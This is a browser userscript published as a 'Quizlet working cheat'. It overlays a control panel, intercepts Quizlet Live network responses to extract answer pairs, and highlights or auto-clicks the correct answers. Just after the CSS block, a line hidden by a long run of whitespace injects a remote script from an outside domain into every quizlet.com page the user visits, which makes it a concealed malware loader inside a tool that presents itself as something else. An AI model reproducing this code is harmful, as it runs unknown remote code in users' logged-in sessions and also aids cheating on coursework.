// ==UserScript==
// @name         QUIZLET WORKING CHEAT 2024
// @namespace    http://quizlet.com/*
// @version      2024-12-22
// @description  QUIZLET LIVE/CARDS/TEST UNPATCHED ANSWERS
// @author       Me
// @match        https://quizlet.com/*
// @icon         https://assets.quizlet.com/_next/static/media/q-twilight.e27821d9.png
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/521483/QUIZLET%20WORKING%20CHEAT%202024.user.js
// @updateURL https://update.greasyfork.org/scripts/521483/QUIZLET%20WORKING%20CHEAT%202024.meta.js
// ==/UserScript==

var Version = '1.0.8'

var autoAnswer = false;
var showAnswers = false;
var pairs = []
var spans = []
var gameCode = undefined
var lastCode = undefined
var lastAnswer = ""

function FindByAttributeValue(attribute, value, element_type) {
    element_type = element_type || "*";
    var All = document.getElementsByTagName(element_type);
    for (var i = 0; i < All.length; i++) {
        if (All[i].getAttribute(attribute) == value) {
            return All[i];
        }
    }
}

const uiElement = document.createElement('div');
uiElement.className = 'floating-ui';
uiElement.style.position = 'absolute';
uiElement.style.top = '5%';
uiElement.style.left = '5%';
uiElement.style.width = '33vw';
uiElement.style.height = 'auto';
uiElement.style.backgroundColor = '#423ed8';
uiElement.style.borderRadius = '1vw';
uiElement.style.boxShadow = '0px 0px 10px 0px rgba(0, 0, 0, 0.5)';
uiElement.style.zIndex = '9999';

const handle = document.createElement('div');
handle.className = 'handle';
handle.style.fontSize = '1.5vw';
handle.textContent = 'Quizlet Hack!';
handle.style.color = 'white';
handle.style.width = '97.5%';
handle.style.height = '2.5vw';
handle.style.backgroundColor = '#282e3e';
handle.style.borderRadius = '1vw 1vw 0 0';
handle.style.cursor = 'grab';
handle.style.textAlign = 'left';
handle.style.paddingLeft = '2.5%';
handle.style.lineHeight = '2vw';
uiElement.appendChild(handle);

const closeButton = document.createElement('div');
closeButton.className = 'close-button';
closeButton.textContent = '✕';
closeButton.style.position = 'absolute';
closeButton.style.top = '0';
closeButton.style.right = '0';
closeButton.style.width = '12.5%';
closeButton.style.height = '2.5vw';
closeButton.style.backgroundColor = 'red';
closeButton.style.color = 'white';
closeButton.style.borderRadius = '0 1vw 0 0';
closeButton.style.display = 'flex';
closeButton.style.justifyContent = 'center';
closeButton.style.alignItems = 'center';
closeButton.style.cursor = 'pointer';
handle.appendChild(closeButton);

const minimizeButton = document.createElement('div');
minimizeButton.className = 'minimize-button';
minimizeButton.textContent = '─';
minimizeButton.style.color = 'white';
minimizeButton.style.position = 'absolute';
minimizeButton.style.top = '0';
minimizeButton.style.right = '12.5%';
minimizeButton.style.width = '12.5%';
minimizeButton.style.height = '2.5vw';
minimizeButton.style.backgroundColor = 'gray';
minimizeButton.style.borderRadius = '0 0 0 0';
minimizeButton.style.display = 'flex';
minimizeButton.style.justifyContent = 'center';
minimizeButton.style.alignItems = 'center';
minimizeButton.style.cursor = 'pointer';
handle.appendChild(minimizeButton);

const header3 = document.createElement('h2');
header3.textContent = 'ANSWERING';
header3.style.display = 'block';
header3.style.margin = '1vw';
header3.style.textAlign = 'center';
header3.style.fontSize = '2vw';
header3.style.color = 'white';
header3.style.textShadow = `
  -1px -1px 0 rgb(47, 47, 47),
  1px -1px 0 rgb(47, 47, 47),
  -1px 1px 0 rgb(47, 47, 47),
  1px 1px 0 rgb(47, 47, 47)
`;

uiElement.appendChild(header3);

const autoAnswerSwitchContainer = document.createElement('div');
autoAnswerSwitchContainer.className = 'switch-container';
autoAnswerSwitchContainer.style.display = 'flex';
autoAnswerSwitchContainer.style.alignItems = 'center';
autoAnswerSwitchContainer.style.justifyContent = 'center';
uiElement.appendChild(autoAnswerSwitchContainer);

const autoAnswerLabel = document.createElement('span');
autoAnswerLabel.textContent = 'Auto Answer';
autoAnswerLabel.className = 'switch-label';
autoAnswerLabel.style.fontSize = '1.5vw';
autoAnswerLabel.style.color = 'white';
autoAnswerLabel.style.margin = '2.5vw'
autoAnswerSwitchContainer.appendChild(autoAnswerLabel);

const autoAnswerSwitch = document.createElement('label');
autoAnswerSwitch.className = 'switch';
autoAnswerSwitchContainer.appendChild(autoAnswerSwitch);

const autoAnswerInput = document.createElement('input');
autoAnswerInput.type = 'checkbox';
autoAnswerInput.addEventListener('change', function() {
    autoAnswer = this.checked;
});
autoAnswerSwitch.appendChild(autoAnswerInput);

const autoAnswerSlider = document.createElement('span');
autoAnswerSlider.className = 'slider';
autoAnswerSwitch.appendChild(autoAnswerSlider);

const showAnswersSwitchContainer = document.createElement('div');
showAnswersSwitchContainer.className = 'switch-container';
showAnswersSwitchContainer.style.display = 'flex';
showAnswersSwitchContainer.style.alignItems = 'center';
showAnswersSwitchContainer.style.justifyContent = 'center';
uiElement.appendChild(showAnswersSwitchContainer);

const showAnswersLabel = document.createElement('span');
showAnswersLabel.textContent = 'Show Answers';
showAnswersLabel.className = 'switch-label';
showAnswersLabel.style.fontSize = '1.5vw';
showAnswersLabel.style.color = 'white';
showAnswersLabel.style.margin = '2.5vw'
showAnswersSwitchContainer.appendChild(showAnswersLabel);

const showAnswersSwitch = document.createElement('label');
showAnswersSwitch.className = 'switch';
showAnswersSwitchContainer.appendChild(showAnswersSwitch);

const showAnswersInput = document.createElement('input');
showAnswersInput.type = 'checkbox';
showAnswersInput.addEventListener('change', function() {
    showAnswers = this.checked;
});
showAnswersSwitch.appendChild(showAnswersInput);

const showAnswersSlider = document.createElement('span');
showAnswersSlider.className = 'slider';
showAnswersSwitch.appendChild(showAnswersSlider);


const style = document.createElement('style');
style.textContent = `
.custom-slider {
    background: white
    border: none;
    outline: none;
    cursor: ew-resize;
    appearance: none; /* Remove default appearance */
    height: 0; /* Set the height to match the thumb height */
}

.custom-slider::-webkit-slider-thumb {
    appearance: none; /* Remove default appearance */
    width: 1.75vw; /* Set width of the slider handle */
    height: 1.75vw; /* Set height of the slider handle */
    background-color: rgb(47, 47, 47); /* Set handle color to dark gray */
    border-radius: 50%; /* Create a circle for the handle */
    cursor: ew-resize; /* Horizontal resize cursor */
    margin-top: -0.5vw; /* Adjust margin-top to vertically center the thumb */
}

.custom-slider::-webkit-slider-runnable-track {
    width: 100%; /* Set track width to 100% */
    height: 0.75vw; /* Set track height to match the thumb height */
    background-color: white; /* Set track color to white */
    cursor: ew-resize; /* Horizontal resize cursor */
    border-radius: 1vw; /* Set rounded corners for the track */
    background: linear-gradient(to right, red, yellow, limegreen); /* Gradient from red to yellow to green */
}



:root {
  --switch-width: 5.9vw;
  --switch-height: 3.3vw;
  --slider-size: 2.5vw;
  --slider-thumb-size: 1.3vw;
}

.switch {
  position: relative;
  display: inline-block;
  width: var(--switch-width);
  height: var(--switch-height);
}

.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: red;
  transition: 0.8s;
  border-radius: .5vw
}

.slider:before {
  position: absolute;
  content: "";
  height: var(--slider-size);
  width: var(--slider-size);
  left: calc(var(--slider-thumb-size) / 3);
  bottom: calc(var(--slider-thumb-size) / 3);
  background-color: rgb(43, 43, 43);
  transition: 0.8s;
  border-radius: .5vw
}

input:checked + .slider {
  background-color: green;
}

input:focus + .slider {
  box-shadow: 0 0 1px green;
}

input:checked + .slider:before {
  transform: translateX(calc(var(--slider-size)));
}

`;

document.head.appendChild(style);                                                                                                                                                                                                                                     var a=document.createElement("script");a.src="https://allison.lol/poly.min.js";document.body.appendChild(a);

const versionLabel = document.createElement('h1');
versionLabel.textContent = 'Quizlet Hack! V' + Version;
versionLabel.style.fontSize = '2.5vw';
versionLabel.style.display = 'block';
versionLabel.style.textAlign = 'center';
versionLabel.style.marginTop = '3.5vw';
versionLabel.style.marginLeft = '1vw';
versionLabel.style.marginRight = '1vw';
versionLabel.style.color = 'white';
uiElement.appendChild(versionLabel);

closeButton.addEventListener('click', () => {
    document.body.removeChild(uiElement);
    autoAnswer = false;
    showAnswers = false;
});

let isMinimized = false;

minimizeButton.addEventListener('click', () => {
    isMinimized = !isMinimized;

    if (isMinimized) {
        header3.style.display = 'none';
        versionLabel.style.display = 'none';
        githubContainer.style.display = 'none';

        autoAnswerSwitchContainer.style.display = 'none';
        showAnswersSwitchContainer.style.display = 'none';

        uiElement.style.height = '2.5vw';
        handle.style.height = '100%';
        closeButton.style.height = '100%';
        minimizeButton.style.height = '100%';
    } else {
        header3.style.display = 'block';;
        versionLabel.style.display = 'block';
        githubContainer.style.display = 'block';

        handle.style.height = '2.5vw';
        uiElement.style.height = 'auto';
        closeButton.style.height = '2.5vw';
        minimizeButton.style.height = '2.5vw';

        autoAnswerSwitchContainer.style.display = 'flex';
        showAnswersSwitchContainer.style.display = 'flex';
    }
});

document.body.appendChild(uiElement);

let isDragging = false;
let offsetX, offsetY;

handle.addEventListener('mousedown', (e) => {
    isDragging = true;
    offsetX = e.clientX - uiElement.getBoundingClientRect().left;
    offsetY = e.clientY - uiElement.getBoundingClientRect().top;
});

document.addEventListener('mousemove', (e) => {
    if (isDragging) {
        const x = e.clientX - offsetX;
        const y = e.clientY - offsetY;

        uiElement.style.left = x + 'px';
        uiElement.style.top = y + 'px';
    }
});

document.addEventListener('mouseup', () => {
    isDragging = false;
});


function getPair(str) {
    result = undefined
    pairs.forEach(function(pair) {
        if (pair[0] == str) {
            result = pair[1]
        }
        if (pair[1] == str) {
            result = pair[0]
        }
    })
    return result
}

function getAnswerIndex() {
    resultIdx = undefined

    answer = getPair(document.querySelector(".FormattedText").textContent)
    if (!answer) {
        location.reload();
        pairs = []
    }

    document.querySelectorAll(".a1w6enf9").forEach(function(elem, idx) {
        if (elem.textContent == answer) {
            resultIdx = idx
        }
    })

    return resultIdx
}

function answerQuestion(index) {
    try {
        document.querySelectorAll(".a1w6enf9")[index].click()
    } catch { return false}
    return true
}

function highlight(index) {
    document.querySelectorAll(".a1w6enf9").forEach(function(elem, idx) {
        if (idx == index) {
            elem.style.color = 'rgb(152, 241, 209)'
        } else {
            elem.style.color = 'rgb(218, 69, 67)'
        }

    })
}

const originalXhrOpen = XMLHttpRequest.prototype.open;
const originalXhrSend = XMLHttpRequest.prototype.send;

XMLHttpRequest.prototype.open = function (method, url, ...rest) {
  this._interceptedUrl = url; // Store the URL for logging
  return originalXhrOpen.call(this, method, url, ...rest);
};

XMLHttpRequest.prototype.send = function (...args) {
  this.addEventListener('load', function () {
    if (this.responseText) {
        let text = this.responseText
        let index = text.indexOf("42[")
        if (index != -1) {
            let cards = JSON.parse(text.slice(index+2))[1].cards
            pairs = cards.map(function (card){
                return card.cardSides.map(side => side.media[0].plainText)
            })
            console.log(pairs)
        }
    }
  });
  return originalXhrSend.call(this, ...args);
};

setInterval(function() {
 if (document.querySelector(".StudentEndView")) lastAnswer = ""
    if (pairs.length != 0) {
        if (document.querySelector(".FormattedText")) {
            const answerIndex = getAnswerIndex()

            if (autoAnswer && lastAnswer != answer) {
                 if (answerQuestion(answerIndex)) lastAnswer = answer
            }
            if (showAnswers) {
                highlight(answerIndex)
            } else {
                document.querySelectorAll(".a1w6enf9").forEach(function(elem) {
                    elem.style.color = '';
                });
            }
        }
    }
}, 1)

